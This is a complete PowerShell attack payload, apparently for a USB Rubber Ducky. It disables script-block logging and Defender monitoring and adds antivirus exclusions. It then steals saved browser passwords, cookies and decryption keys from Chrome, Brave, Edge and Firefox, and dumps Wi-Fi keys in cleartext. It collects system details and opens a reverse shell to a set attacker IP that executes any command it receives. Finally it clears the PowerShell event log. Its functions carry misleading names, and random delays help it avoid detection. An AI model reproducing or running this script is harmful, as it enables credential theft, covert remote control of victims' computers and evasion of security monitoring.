#-- Payload configuration --#

$DRIVE = 'USB_STORAGE'      	# Drive letter of the USB Rubber Ducky
$IP = '192.168.7.180' 	# IP address of the attacker machine
$PORT = 'YOUR_PORT'        	# Port to use for the reverse shell

# Disable logging
Set-ItemProperty -Path “HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging” -Name EnableScriptBlockLogging -Value 0

# Set destination directory



$duckletter = (Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.VolumeName -eq $DRIVE }).DeviceID
Set-Location $duckletter

Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "${duckletter}\"
Set-MpPreference -ExclusionExtension "ps1"

$destDir = "$duckletter\$env:USERNAME"
if (-Not (Test-Path $destDir)) {
	New-Item -ItemType Directory -Path $destDir
}

Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 60)

# Function to copy browser files
function StartCleanUp($browserName, $browserDir, $filesToCopy) {
	$browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
	if (-Not (Test-Path $browserDestDir)) {
    	New-Item -ItemType Directory -Path $browserDestDir
	}

	foreach ($file in $filesToCopy) {
    	$source = Join-Path -Path $browserDir -ChildPath $file
    	if (Test-Path $source) {
        	Copy-Item -Path $source -Destination $browserDestDir
        	Write-Host "$browserName - File copiato: $file"
    	} else {
        	Write-Host "$browserName - File non trovato: $file"
    	}
	}
}

Start-Sleep -Seconds (Get-Random -Minimum 10 - Maximum 60)

# Configuration for Google Chrome
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeFilesToCopy = @("Login Data")
StartCleanUp"Chrome" $chromeDir $chromeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue

# Configuration for Brave
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveFilesToCopy = @("Login Data")
StartCleanUp"Brave" $braveDir $braveFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue

Start-Sleep -Seconds (Get-Random -Minimum 20 -Maximum 80)

# Configuration for Firefox
$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
if ($firefoxProfile) {
	$firefoxDir = $firefoxProfile.FullName
	$firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
	StartCleanUp"Firefox" $firefoxDir $firefoxFilesToCopy
} else {
	Write-Host "Firefox - Nessun profilo trovato."
}

# Configuration for Microsoft Edge
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeFilesToCopy = @("Login Data")
StartCleanUp"Edge" $edgeDir $edgeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue

Start-Sleep -Seconds (Get-Random -Minimum 15 -Maximum 70)

# Gather additional system information
function UpdateSubsystemD{
	$sysInfoDir = "$duckletter\$env:USERNAME\SystemInfo"
	if (-Not (Test-Path $sysInfoDir)) {
    	New-Item -ItemType Directory -Path $sysInfoDir
	}

	Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
	Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
	Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
	Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
}

UpdateSubsystemD

# Network scanning


# Retrieve Wi-Fi passwords
function RetrieveStartCode{
	$wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }

	$results = @()

	foreach ($profile in $wifiProfiles) {
    	$profileDetails = netsh wlan show profile name="$profile" key=clear
    	$keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
    	$results += [PSCustomObject]@{
        	ProfileName = $profile
        	KeyContent  = $keyContent
    	}
	}

	$results | Format-Table -AutoSize

	# Save results to a file
	$results | Out-File -FilePath "$duckletter\$env:USERNAME\WiFi_Details.txt"
}

Start-Sleep -Seconds (Get-Random -Minimum 20 -Maximum 80)

RetrieveStartCode

# Reverse shell
function ReverseShell {
	param(
    	[string]$ip,
    	[int]$port
	)

	$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
	$stream = $client.GetStream()
	[byte[]]$bytes = 0..65535 | ForEach-Object {0}
	while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    	$sendback = (Invoke-Expression $data 2>&1 | Out-String)
    	$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
    	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    	$stream.Write($sendbyte, 0, $sendbyte.Length)
    	$stream.Flush()
	}
	$client.Close()
}

Start-Sleep -Seconds (Get-Random -Minimum 25 -Maximum 85)

ReverseShell -ip $IP -port $PORT

# Clearing logs

wevtutil cl “Microsoft-Windows-PowerShell/Operational”

# Re-enable Windows Defender real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $false

exit
